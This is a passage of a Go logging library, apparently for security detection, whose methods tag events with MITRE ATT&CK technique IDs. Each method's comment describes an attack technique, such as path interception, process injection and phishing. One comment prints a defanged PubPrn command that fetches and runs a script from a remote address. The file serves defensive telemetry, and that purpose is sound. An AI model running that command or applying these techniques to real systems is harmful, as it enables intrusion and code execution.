from the command-line. Search Order Hijacking Search order hijacking occurs when
an adversary abuses the order in which Windows searches for programs that are
not given a path. The search order differs depending on the method that is used
to execute the program. (Citation: Microsoft CreateProcess) (Citation: Hill NT
Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search
in the directory of the initiating program before searching through the Windows
system directory. An adversary who finds a program vulnerable to search order
hijacking (i.e., a program that does not specify the path to an executable) may
take advantage of this vulnerability by creating a program named after the
improperly specified program and placing it within the initiating program's
directory. For example, "example.exe" runs "cmd.exe" with the command-line
argument net user. An adversary may place a program called "net.exe" within the
same directory as example.exe, "net.exe" will be run instead of the Windows
system utility net. In addition, if an adversary places a program called
"net.com" in the same directory as "net.exe", then cmd.exe /C net user will
execute "net.com" instead of "net.exe" due to the order of executable extensions
defined under PATHEXT. (Citation: MSDN Environment Property) Search order
hijacking is also a common practice for hijacking DLL loads and is covered in
DLL Search Order Hijacking.
*/
func (g *Session) ATTACKEntPathInterception(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1034").
        Msg("path interception")
}

/* ATTACKEntPathInterceptionbyPATHEnvironmentVariable Phases: persistence privilege-escalation defense-evasion

Adversaries may execute their own malicious payloads by hijacking environment
variables used to load libraries. Adversaries may place a program in an earlier
entry in the list of directories stored in the PATH environment variable, which
Windows will then execute when it searches sequentially through that PATH
listing in search of the binary that was called from a script or the command
line. The PATH environment variable contains a list of directories. Certain
methods of executing a program (namely using cmd.exe or the command-line) rely
solely on the PATH environment variable to determine the locations that are
searched for a program when the path for the program is not given. If any
directories are listed in the PATH environment variable before the Windows
directory, %SystemRoot%\system32 (e.g., C:\Windows\system32), a program may be
placed in the preceding directory that is named the same as a Windows program
(such as cmd, PowerShell, or Python), which will be executed when that command
is executed from a script or command-line. For example, if C:\example path
precedes C:\Windows\system32 is in the PATH environment variable, a program that
is named net.exe and placed in C:\example path will be called instead of the
Windows system "net" when "net" is executed from the command-line.
*/
func (g *Session) ATTACKEntPathInterceptionbyPATHEnvironmentVariable(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1574.007").
        Msg("path interception by path environment variable")
}

/* ATTACKEntPathInterceptionbySearchOrderHijacking Phases: persistence privilege-escalation defense-evasion

Adversaries may execute their own malicious payloads by hijacking the search
order used to load other programs. Because some programs do not call other
programs using the full path, adversaries may place their own file in the
directory where the calling program is located, causing the operating system to
launch their malicious software at the request of the calling program. Search
order hijacking occurs when an adversary abuses the order in which Windows
searches for programs that are not given a path. Unlike DLL Search Order
Hijacking, the search order differs depending on the method that is used to
execute the program. (Citation: Microsoft CreateProcess) (Citation: Windows NT
Command Shell) (Citation: Microsoft WinExec) However, it is common for Windows
to search in the directory of the initiating program before searching through
the Windows system directory. An adversary who finds a program vulnerable to
search order hijacking (i.e., a program that does not specify the path to an
executable) may take advantage of this vulnerability by creating a program named
after the improperly specified program and placing it within the initiating
program's directory. For example, "example.exe" runs "cmd.exe" with the command-
line argument net user. An adversary may place a program called "net.exe" within
the same directory as example.exe, "net.exe" will be run instead of the Windows
system utility net. In addition, if an adversary places a program called
"net.com" in the same directory as "net.exe", then cmd.exe /C net user will
execute "net.com" instead of "net.exe" due to the order of executable extensions
defined under PATHEXT. (Citation: Microsoft Environment Property) Search order
hijacking is also a common practice for hijacking DLL loads and is covered in
DLL Search Order Hijacking.
*/
func (g *Session) ATTACKEntPathInterceptionbySearchOrderHijacking(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1574.008").
        Msg("path interception by search order hijacking")
}

/* ATTACKEntPathInterceptionbyUnquotedPath Phases: persistence privilege-escalation defense-evasion

Adversaries may execute their own malicious payloads by hijacking vulnerable
file path references. Adversaries can take advantage of paths that lack
surrounding quotations by placing an executable in a higher level directory
within the path, so that Windows will choose the adversary's executable to
launch. Service paths (Citation: Microsoft CurrentControlSet Services) and
shortcut paths may also be vulnerable to path interception if the path has one
or more spaces and is not surrounded by quotation marks (e.g., C:\unsafe path
with space\program.exe vs. "C:\safe path with space\program.exe"). (Citation:
Help eliminate unquoted path) (stored in Windows Registry keys) An adversary can
place an executable in a higher level directory of the path, and Windows will
resolve that executable instead of the intended executable. For example, if the
path in a shortcut is C:\program files\myapp.exe, an adversary may create a
program at C:\program.exe that will be run instead of the intended program.
(Citation: Windows Unquoted Services) (Citation: Windows Privilege Escalation
Guide) This technique can be used for persistence if executables are called on a
regular basis, as well as privilege escalation if intercepted executables are
started by a higher privileged process.
*/
func (g *Session) ATTACKEntPathInterceptionbyUnquotedPath(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1574.009").
        Msg("path interception by unquoted path")
}

/* ATTACKEntPeripheralDeviceDiscovery Phases: discovery

Adversaries may attempt to gather information about attached peripheral devices
and components connected to a computer system. Peripheral devices could include
auxiliary resources that support a variety of functionalities such as keyboards,
printers, cameras, smart card readers, or removable storage. The information may
be used to enhance their awareness of the system and network environment or may
be used for further actions.
*/
func (g *Session) ATTACKEntPeripheralDeviceDiscovery(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1120").
        Msg("peripheral device discovery")
}

/* ATTACKEntPermissionGroupsDiscovery Phases: discovery

Adversaries may attempt to find group and permission settings. This information
can help adversaries determine which user accounts and groups are available, the
membership of users in particular groups, and which users and groups have
elevated permissions.
*/
func (g *Session) ATTACKEntPermissionGroupsDiscovery(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1069").
        Msg("permission groups discovery")
}

/* ATTACKEntPhishing Phases: initial-access

Adversaries may send phishing messages to gain access to victim systems. All
forms of phishing are electronically delivered social engineering. Phishing can
be targeted, known as spearphishing. In spearphishing, a specific individual,
company, or industry will be targeted by the adversary. More generally,
adversaries can conduct non-targeted phishing, such as in mass malware spam
campaigns. Adversaries may send victims emails containing malicious attachments
or links, typically to execute malicious code on victim systems. Phishing may
also be conducted via third-party services, like social media platforms.
Phishing may also involve social engineering techniques, such as posing as a
trusted source.
*/
func (g *Session) ATTACKEntPhishing(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1566").
        Msg("phishing")
}

/* ATTACKEntPhishingforInformation Phases: reconnaissance

Adversaries may send phishing messages to elicit sensitive information that can
be used during targeting. Phishing for information is an attempt to trick
targets into divulging information, frequently credentials or other actionable
information. Phishing for information is different from Phishing in that the
objective is gathering data from the victim rather than executing malicious
code. All forms of phishing are electronically delivered social engineering.
Phishing can be targeted, known as spearphishing. In spearphishing, a specific
individual, company, or industry will be targeted by the adversary. More
generally, adversaries can conduct non-targeted phishing, such as in mass
credential harvesting campaigns. Adversaries may also try to obtain information
directly through the exchange of emails, instant messages, or other electronic
conversation means.(Citation: ThreatPost Social Media Phishing)(Citation:
TrendMictro Phishing)(Citation: PCMag FakeLogin)(Citation: Sophos
Attachment)(Citation: GitHub Phishery) Phishing for information frequently
involves social engineering techniques, such as posing as a source with a reason
to collect information (ex: Establish Accounts or Compromise Accounts) and/or
sending multiple, seemingly urgent messages.
*/
func (g *Session) ATTACKEntPhishingforInformation(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1598").
        Msg("phishing for information")
}

/* ATTACKEntPlistModification Phases: persistence privilege-escalation

Adversaries may modify plist files to run a program during system boot or user
login. Property list (plist) files contain all of the information that macOS and
OS X uses to configure applications and services. These files are UTF-8 encoded
and formatted like XML documents via a series of keys surrounded by < >. They
detail when programs should execute, file paths to the executables, program
arguments, required OS permissions, and many others. plists are located in
certain locations depending on their purpose such as /Library/Preferences (which
execute with elevated privileges) and ~/Library/Preferences (which execute with
a user's privileges).  Adversaries can modify plist files to execute their code
as part of establishing persistence. plists may also be used to elevate
privileges since they may execute in the context of another user.(Citation:
Sofacy Komplex Trojan)  A specific plist used for execution at login is
com.apple.loginitems.plist.(Citation: Methods of Mac Malware Persistence)
Applications under this plist run under the logged in user's context, and will
be started every time the user logs in. Login items installed using the Service
Management Framework are not visible in the System Preferences and can only be
removed by the application that created them.(Citation: Adding Login Items)
Users have direct control over login items installed using a shared file list
which are also visible in System Preferences (Citation: Adding Login Items).
Some of these applications can open visible dialogs to the user, but they don’t
all have to since there is an option to "hide" the window. If an adversary can
register their own login item or modified an existing one, then they can use it
to execute their code for a persistence mechanism each time the user logs in
(Citation: Malware Persistence on OS X) (Citation: OSX.Dok Malware). The API
method  SMLoginItemSetEnabled can be used to set Login Items, but scripting
languages like AppleScript can do this as well. (Citation: Adding Login Items)
*/
func (g *Session) ATTACKEntPlistModification(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1547.011").
        Msg("plist modification")
}

/* ATTACKEntPluggableAuthenticationModules Phases: credential-access defense-evasion persistence

Adversaries may modify pluggable authentication modules (PAM) to access user
credentials or enable otherwise unwarranted access to accounts. PAM is a modular
system of configuration files, libraries, and executable files which guide
authentication for many services. The most common authentication module is
pam_unix.so, which retrieves, sets, and verifies account authentication
information in /etc/passwd and /etc/shadow.(Citation: Apple PAM)(Citation: Man
Pam_Unix)(Citation: Red Hat PAM) Adversaries may modify components of the PAM
system to create backdoors. PAM components, such as pam_unix.so, can be patched
to accept arbitrary adversary supplied values as legitimate
credentials.(Citation: PAM Backdoor) Malicious modifications to the PAM system
may also be abused to steal credentials. Adversaries may infect PAM resources
with code to harvest user credentials, since the values exchanged with PAM
components may be plain-text since PAM does not store passwords.(Citation: PAM
Creds)(Citation: Apple PAM)
*/
func (g *Session) ATTACKEntPluggableAuthenticationModules(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1556.003").
        Msg("pluggable authentication modules")
}

/* ATTACKEntPortKnocking Phases: defense-evasion persistence command-and-control

Adversaries may use port knocking to hide open ports used for persistence or
command and control. To enable a port, an adversary sends a series of attempted
connections to a predefined sequence of closed ports. After the sequence is
completed, opening a port is often accomplished by the host based firewall, but
could also be implemented by custom software. This technique has been observed
to both for the dynamic opening of a listening port as well as the initiating of
a connection to a listening server on a different system. The observation of the
signal packets to trigger the communication can be conducted through different
methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r
2002), is to use the libpcap libraries to sniff for the packets in question.
Another method leverages raw sockets, which enables the malware to use ports
that are already open for use by other programs.
*/
func (g *Session) ATTACKEntPortKnocking(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1205.001").
        Msg("port knocking")
}

/* ATTACKEntPortMonitors Phases: persistence privilege-escalation

Adversaries may use port monitors to run an attacker supplied DLL during system
boot for persistence or privilege escalation. A port monitor can be set through
the AddMonitor API call to set a DLL to be loaded at startup. (Citation:
AddMonitor) This DLL can be located in C:\Windows\System32 and will be loaded by
the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also
runs under SYSTEM level permissions. (Citation: Bloxham) Alternatively, an
arbitrary DLL can be loaded if permissions allow writing a fully-qualified
pathname for that DLL to HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors.
The Registry key contains entries for the following:  Local Port Standard TCP/IP
Port USB Monitor WSD Port  Adversaries can use this technique to load malicious
code at startup that will persist on system reboot and execute as SYSTEM.
*/
func (g *Session) ATTACKEntPortMonitors(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1547.010").
        Msg("port monitors")
}

/* ATTACKEntPortableExecutableInjection Phases: defense-evasion privilege-escalation

Adversaries may inject portable executables (PE) into processes in order to
evade process-based defenses as well as possibly elevate privileges. PE
injection is a method of executing arbitrary code in the address space of a
separate live process.  PE injection is commonly performed by copying code
(perhaps without a file on disk) into the virtual address space of the target
process before invoking it via a new thread. The write can be performed with
native Windows API calls such as VirtualAllocEx and WriteProcessMemory, then
invoked with CreateRemoteThread or additional code (ex: shellcode). The
displacement of the injected code does introduce the additional requirement for
functionality to remap memory references. (Citation: Elastic Process Injection
July 2017)  Running code in the context of another process may allow access to
the process's memory, system/network resources, and possibly elevated
privileges. Execution via PE injection may also evade detection from security
products since the execution is masked under a legitimate process.
*/
func (g *Session) ATTACKEntPortableExecutableInjection(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1055.002").
        Msg("portable executable injection")
}

/* ATTACKEntPowerShell Phases: execution

Adversaries may abuse PowerShell commands and scripts for execution. PowerShell
is a powerful interactive command-line interface and scripting environment
included in the Windows operating system. (Citation: TechNet PowerShell)
Adversaries can use PowerShell to perform a number of actions, including
discovery of information and execution of code. Examples include the Start-
Process cmdlet which can be used to run an executable and the Invoke-Command
cmdlet which runs a command locally or on a remote computer (though
administrator permissions are required to use PowerShell to connect to remote
systems). PowerShell may also be used to download and run executables from the
Internet, which can be executed from disk or in memory without touching disk. A
number of PowerShell-based offensive testing tools are available, including
Empire,  PowerSploit, PoshC2, and PSAttack.(Citation: Github PSAttack)
PowerShell commands/scripts can also be executed without directly invoking the
powershell.exe binary through interfaces to PowerShell's underlying
System.Management.Automation assembly DLL exposed through the .NET framework and
Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan
2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft
PSfromCsharp APR 2014)
*/
func (g *Session) ATTACKEntPowerShell(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1059.001").
        Msg("powershell")
}

/* ATTACKEntPowerShellProfile Phases: privilege-escalation persistence

Adversaries may gain persistence and elevate privileges by executing malicious
content triggered by PowerShell profiles. A PowerShell profile  (profile.ps1) is
a script that runs when PowerShell starts and can be used as a logon script to
customize user environments. PowerShell supports several profiles depending on
the user or host program. For example, there can be different profiles for
PowerShell host programs such as the PowerShell console, PowerShell ISE or
Visual Studio Code. An administrator can also configure a profile that applies
to all users and host programs on the local computer. (Citation: Microsoft About
Profiles)  Adversaries may modify these profiles to include arbitrary commands,
functions, modules, and/or PowerShell drives to gain persistence. Every time a
user opens a PowerShell session the modified script will be executed unless the
-NoProfile flag is used when it is launched. (Citation: ESET Turla PowerShell
May 2019)  An adversary may also be able to escalate privileges if a script in a
PowerShell profile is loaded and executed by an account with higher privileges,
such as a domain administrator. (Citation: Wits End and Shady PowerShell
Profiles)
*/
func (g *Session) ATTACKEntPowerShellProfile(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1546.013").
        Msg("powershell profile")
}

/* ATTACKEntPreOSBoot Phases: defense-evasion persistence

Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence
on a system. During the booting process of a computer, firmware and various
startup services are loaded before the operating system. These programs control
flow of execution before the operating system takes control.(Citation: Wikipedia
Booting) Adversaries may overwrite data in boot drivers or firmware such as BIOS
(Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI)
to persist on systems at a layer below the operating system. This can be
particularly difficult to detect as malware at this level will not be detected
by host software-based defenses.
*/
func (g *Session) ATTACKEntPreOSBoot(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1542").
        Msg("pre-os boot")
}

/* ATTACKEntPrintProcessors Phases: persistence privilege-escalation

Adversaries may abuse print processors to run malicious DLLs during system boot
for persistence and/or privilege escalation. Print processors are DLLs that are
loaded by the print spooler service, spoolsv.exe, during boot.  Adversaries may
abuse the print spooler service by adding print processors that load malicious
DLLs at startup. A print processor can be installed through the
AddPrintProcessor API call with an account that has SeLoadDriverPrivilege
enabled. Alternatively, a print processor can be registered to the print spooler
service by adding the HKLM\SYSTEM\[CurrentControlSet or
ControlSet001]\Control\Print\Environments\[Windows architecture: e.g., Windows
x64]\Print Processors\[user defined]\Driver Registry key that points to the DLL.
For the print processor to be correctly installed, it must be located in the
system print-processor directory that can be found with the
GetPrintProcessorDirectory API call.(Citation: Microsoft AddPrintProcessor May
2018) After the print processors are installed, the print spooler service, which
starts during boot, must be restarted in order for them to run.(Citation: ESET
PipeMon May 2020) The print spooler service runs under SYSTEM level permissions,
therefore print processors installed by an adversary may run under elevated
privileges.
*/
func (g *Session) ATTACKEntPrintProcessors(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1547.012").
        Msg("print processors")
}

/* ATTACKEntPrivateKeys Phases: credential-access

Adversaries may search for private key certificate files on compromised systems
for insecurely stored credentials. Private cryptographic keys and certificates
are used for authentication, encryption/decryption, and digital
signatures.(Citation: Wikipedia Public Key Crypto) Common key and certificate
file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b,
.asc.  Adversaries may also look in common key directories, such as ~/.ssh for
SSH keys on * nix-based systems or C:\Users\(username)\.ssh\ on Windows. These
private keys can be used to authenticate to Remote Services like SSH or for use
in decrypting other collected files such as email. Adversary tools have been
discovered that search compromised systems for file extensions relating to
cryptographic keys and certificates.(Citation: Kaspersky Careto)(Citation: Palo
Alto Prince of Persia) Some private keys require a password or passphrase for
operation, so an adversary may also use Input Capture for keylogging or attempt
to Brute Force the passphrase off-line.
*/
func (g *Session) ATTACKEntPrivateKeys(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1552.004").
        Msg("private keys")
}

/* ATTACKEntProcFilesystem Phases: credential-access

Adversaries may gather credentials from information stored in the Proc
filesystem or /proc. The Proc filesystem on Linux contains a great deal of
information regarding the state of the running operating system. Processes
running with root privileges can use this facility to scrape live memory of
other running programs. If any of these programs store passwords in clear text
or password hashes in memory, these values can then be harvested for either
usage or brute force attacks, respectively. This functionality has been
implemented in the MimiPenguin(Citation: MimiPenguin GitHub May 2017), an open
source tool inspired by Mimikatz. The tool dumps process memory, then harvests
passwords and hashes by looking for text strings and regex patterns for how
given applications such as Gnome Keyring, sshd, and Apache use memory to store
such authentication artifacts.
*/
func (g *Session) ATTACKEntProcFilesystem(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1003.007").
        Msg("proc filesystem")
}

/* ATTACKEntProcMemory Phases: defense-evasion privilege-escalation

Adversaries may inject malicious code into processes via the /proc filesystem in
order to evade process-based defenses as well as possibly elevate privileges.
Proc memory injection is a method of executing arbitrary code in the address
space of a separate live process.  Proc memory injection involves enumerating
the memory of a process via the /proc filesystem (/proc/[pid]) then crafting a
return-oriented programming (ROP) payload with available gadgets/instructions.
Each running process has its own directory, which includes memory mappings. Proc
memory injection is commonly performed by overwriting the target processes’
stack using memory mappings provided by the /proc filesystem. This information
can be used to enumerate offsets (including the stack) and gadgets (or
instructions within the program that can be used to build a malicious payload)
otherwise hidden by process memory protections such as address space layout
randomization (ASLR). Once enumerated, the target processes’ memory map within
/proc/[pid]/maps can be overwritten using dd.(Citation: Uninformed
Needle)(Citation: GDS Linux Injection)(Citation: DD Man)  Other techniques such
as Dynamic Linker Hijacking may be used to populate a target process with more
available gadgets. Similar to Process Hollowing, proc memory injection may
target child processes (such as a backgrounded copy of sleep).(Citation: GDS
Linux Injection)  Running code in the context of another process may allow
access to the process's memory, system/network resources, and possibly elevated
privileges. Execution via proc memory injection may also evade detection from
security products since the execution is masked under a legitimate process.
*/
func (g *Session) ATTACKEntProcMemory(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1055.009").
        Msg("proc memory")
}

/* ATTACKEntProcessDiscovery Phases: discovery

Adversaries may attempt to get information about running processes on a system.
Information obtained could be used to gain an understanding of common
software/applications running on systems within the network. Adversaries may use
the information from Process Discovery during automated discovery to shape
follow-on behaviors, including whether or not the adversary fully infects the
target and/or attempts specific actions. In Windows environments, adversaries
could obtain details on running processes using the Tasklist utility via cmd or
Get-Process via PowerShell. Information about processes can also be extracted
from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and
Linux, this is accomplished with the ps command. Adversaries may also opt to
enumerate processes via /proc.
*/
func (g *Session) ATTACKEntProcessDiscovery(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1057").
        Msg("process discovery")
}

/* ATTACKEntProcessDoppelgänging Phases: defense-evasion privilege-escalation

Adversaries may inject malicious code into process via process doppelgänging in
order to evade process-based defenses as well as possibly elevate privileges.
Process doppelgänging is a method of executing arbitrary code in the address
space of a separate live process.  Windows Transactional NTFS (TxF) was
introduced in Vista as a method to perform safe file operations. (Citation:
Microsoft TxF) To ensure data integrity, TxF enables only one transacted handle
to write to a file at a given time. Until the write handle transaction is
terminated, all other handles are isolated from the writer and may only read the
committed version of the file that existed at the time the handle was opened.
(Citation: Microsoft Basic TxF Concepts) To avoid corruption, TxF performs an
automatic rollback if the system or application fails during a write
transaction. (Citation: Microsoft Where to use TxF) Although deprecated, the TxF
application programming interface (API) is still enabled as of Windows 10.
(Citation: BlackHat Process Doppelgänging Dec 2017) Adversaries may abuse TxF to
a perform a file-less variation of Process Injection. Similar to Process
Hollowing, process doppelgänging involves replacing the memory of a legitimate
process, enabling the veiled execution of malicious code that may evade defenses
and detection. Process doppelgänging's use of TxF also avoids the use of highly-
monitored API functions such as NtUnmapViewOfSection, VirtualProtectEx, and
SetThreadContext. (Citation: BlackHat Process Doppelgänging Dec 2017) Process
Doppelgänging is implemented in 4 steps (Citation: BlackHat Process
Doppelgänging Dec 2017):  Transact – Create a TxF transaction using a legitimate
executable then overwrite the file with malicious code. These changes will be
isolated and only visible within the context of the transaction. Load – Create a
shared section of memory and load the malicious executable. Rollback – Undo
changes to original executable, effectively removing malicious code from the
file system. Animate – Create a process from the tainted section of memory and
initiate execution.  This behavior will likely not result in elevated privileges
since the injected process was spawned from (and thus inherits the security
context) of the injecting process. However, execution via process doppelgänging
may evade detection from security products since the execution is masked under a
legitimate process.
*/
func (g *Session) ATTACKEntProcessDoppelgänging(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1055.013").
        Msg("process doppelgänging")
}

/* ATTACKEntProcessHollowing Phases: defense-evasion privilege-escalation

Adversaries may inject malicious code into suspended and hollowed processes in
order to evade process-based defenses. Process hollowing is a method of
executing arbitrary code in the address space of a separate live process.
Process hollowing is commonly performed by creating a process in a suspended
state then unmapping/hollowing its memory, which can then be replaced with
malicious code. A victim process can be created with native Windows API calls
such as CreateProcess, which includes a flag to suspend the processes primary
thread. At this point the process can be unmapped using APIs calls such as
ZwUnmapViewOfSection or NtUnmapViewOfSection  before being written to, realigned
to the injected code, and resumed via VirtualAllocEx, WriteProcessMemory,
SetThreadContext, then ResumeThread respectively.(Citation: Leitch
Hollowing)(Citation: Elastic Process Injection July 2017) This is very similar
to Thread Local Storage but creates a new process rather than targeting an
existing process. This behavior will likely not result in elevated privileges
since the injected process was spawned from (and thus inherits the security
context) of the injecting process. However, execution via process hollowing may
also evade detection from security products since the execution is masked under
a legitimate process.
*/
func (g *Session) ATTACKEntProcessHollowing(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1055.012").
        Msg("process hollowing")
}

/* ATTACKEntProcessInjection Phases: defense-evasion privilege-escalation

Adversaries may inject code into processes in order to evade process-based
defenses as well as possibly elevate privileges. Process injection is a method
of executing arbitrary code in the address space of a separate live process.
Running code in the context of another process may allow access to the process's
memory, system/network resources, and possibly elevated privileges. Execution
via process injection may also evade detection from security products since the
execution is masked under a legitimate process.  There are many different ways
to inject code into a process, many of which abuse legitimate functionalities.
These implementations exist for every major OS but are typically platform
specific.  More sophisticated samples may perform multiple process injections to
segment modules and further evade detection, utilizing named pipes or other
inter-process communication (IPC) mechanisms as a communication channel.
*/
func (g *Session) ATTACKEntProcessInjection(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1055").
        Msg("process injection")
}

/* ATTACKEntProtocolImpersonation Phases: command-and-control

Adversaries may impersonate legitimate protocols or web service traffic to
disguise command and control activity and thwart analysis efforts. By
impersonating legitimate protocols or web services, adversaries can make their
command and control traffic blend in with legitimate network traffic.
Adversaries may impersonate a fake SSL/TLS handshake to make it look like
subsequent traffic is SSL/TLS encrypted, potentially interfering with some
security tooling, or to make the traffic look like it is related with a trusted
entity.
*/
func (g *Session) ATTACKEntProtocolImpersonation(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1001.003").
        Msg("protocol impersonation")
}

/* ATTACKEntProtocolTunneling Phases: command-and-control

Adversaries may tunnel network communications to and from a victim system within
a separate protocol to avoid detection/network filtering and/or enable access to
otherwise unreachable systems. Tunneling involves explicitly encapsulating a
protocol within another. This behavior may conceal malicious traffic by blending
in with existing traffic and/or provide an outer layer of encryption (similar to
a VPN). Tunneling could also enable routing of network packets that would
otherwise not reach their intended destination, such as SMB, RDP, or other
traffic that would be filtered by network appliances or not routed over the
Internet.  There are various means to encapsulate a protocol within another
protocol. For example, adversaries may perform SSH tunneling (also known as SSH
port forwarding), which involves forwarding arbitrary data over an encrypted SSH
tunnel.(Citation: SSH Tunneling)  Protocol Tunneling may also be abused by
adversaries during Dynamic Resolution. Known as DNS over HTTPS (DoH), queries to
resolve C2 infrastructure may be encapsulated within encrypted HTTPS
packets.(Citation: BleepingComp Godlua JUL19)  Adversaries may also leverage
Protocol Tunneling in conjunction with Proxy and/or Protocol Impersonation to
further conceal C2 communications and infrastructure.
*/
func (g *Session) ATTACKEntProtocolTunneling(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1572").
        Msg("protocol tunneling")
}

/* ATTACKEntProxy Phases: command-and-control

Adversaries may use a connection proxy to direct network traffic between systems
or act as an intermediary for network communications to a command and control
server to avoid direct connections to their infrastructure. Many tools exist
that enable traffic redirection through proxies or port redirection, including
HTRAN, ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools)
Adversaries use these types of proxies to manage command and control
communications, reduce the number of simultaneous outbound network connections,
provide resiliency in the face of connection loss, or to ride over existing
trusted communications paths between victims to avoid suspicion. Adversaries may
chain together multiple proxies to further disguise the source of malicious
traffic. Adversaries can also take advantage of routing schemes in Content
Delivery Networks (CDNs) to proxy command and control traffic.
*/
func (g *Session) ATTACKEntProxy(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1090").
        Msg("proxy")
}

/* ATTACKEntPtraceSystemCalls Phases: defense-evasion privilege-escalation

Adversaries may inject malicious code into processes via ptrace (process trace)
system calls in order to evade process-based defenses as well as possibly
elevate privileges. Ptrace system call injection is a method of executing
arbitrary code in the address space of a separate live process.  Ptrace system
call injection involves attaching to and modifying a running process. The ptrace
system call enables a debugging process to observe and control another process
(and each individual thread), including changing memory and register
values.(Citation: PTRACE man) Ptrace system call injection is commonly performed
by writing arbitrary code into a running process (ex: malloc) then invoking that
memory with PTRACE_SETREGS to set the register containing the next instruction
to execute. Ptrace system call injection can also be done with
PTRACE_POKETEXT/PTRACE_POKEDATA, which copy data to a specific address in the
target processes’ memory (ex: the current address of the next instruction).
(Citation: PTRACE man)(Citation: Medium Ptrace JUL 2018)  Ptrace system call
injection may not be possible targeting processes with high-privileges, and on
some system those that are non-child processes.(Citation: BH Linux Inject)
Running code in the context of another process may allow access to the process's
memory, system/network resources, and possibly elevated privileges. Execution
via ptrace system call injection may also evade detection from security products
since the execution is masked under a legitimate process.
*/
func (g *Session) ATTACKEntPtraceSystemCalls(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1055.008").
        Msg("ptrace system calls")
}

/* ATTACKEntPubPrn Phases: defense-evasion

Adversaries may use the trusted PubPrn script to proxy execution of malicious
files. This behavior may bypass signature validation restrictions and
application control solutions that do not account for use of these scripts.
PubPrn.vbs is a Visual Basic script that publishes a printer to Active Directory
Domain Services. The script is signed by Microsoft and can be used to proxy
execution from a remote site.(Citation: Enigma0x3 PubPrn Bypass) An example
command is cscript C[:]\Windows\System32\Printing_Admin_Scripts\en-
US\pubprn[.]vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.png.
*/
func (g *Session) ATTACKEntPubPrn(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1216.001").
        Msg("pubprn")
}

/* ATTACKEntPurchaseTechnicalData Phases: reconnaissance

Adversaries may purchase technical information about victims that can be used
during targeting. Information about victims may be available for purchase within
reputable private sources and databases, such as paid subscriptions to feeds of
scan databases or other data aggregation services. Adversaries may also purchase
information from less-reputable sources such as dark web or cybercrime
blackmarkets. Adversaries may purchase information about their already
identified targets, or use purchased data to discover opportunities for
successful breaches. Threat actors may gather various technical details from
purchased data, including but not limited to employee contact information,
credentials, or specifics regarding a victim’s infrastructure.(Citation: ZDNET
Selling Data) Information from these sources may reveal opportunities for other
forms of reconnaissance (ex: Phishing for Information or Search Open
Websites/Domains), establishing operational resources (ex: Develop Capabilities
or Obtain Capabilities), and/or initial access (ex: External Remote Services or
Valid Accounts).
*/
func (g *Session) ATTACKEntPurchaseTechnicalData(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1597.002").
        Msg("purchase technical data")
}

/* ATTACKEntPython Phases: execution

Adversaries may abuse Python commands and scripts for execution. Python is a
very popular scripting/programming language, with capabilities to perform many
functions. Python can be executed interactively from the command-line (via the
python.exe interpreter) or via scripts (.py) that can be written and distributed
to different systems. Python code can also be compiled into binary executables.
Python comes with many built-in packages to interact with the underlying system,
such as file operations and device I/O. Adversaries can use these libraries to
download and execute commands or other scripts as well as perform various
malicious behaviors.
*/
func (g *Session) ATTACKEntPython(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1059.006").
        Msg("python")
}

/* ATTACKEntQueryRegistry Phases: discovery

Adversaries may interact with the Windows Registry to gather information about
the system, configuration, and installed software. The Registry contains a
significant amount of information about the operating system, configuration,
software, and security.(Citation: Wikipedia Windows Registry) Information can
easily be queried using the Reg utility, though other means to access the
Registry exist. Some of the information may help adversaries to further their
operation within a network. Adversaries may use the information from Query
Registry during automated discovery to shape follow-on behaviors, including
whether or not the adversary fully infects the target and/or attempts specific
actions.
*/
func (g *Session) ATTACKEntQueryRegistry(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1012").
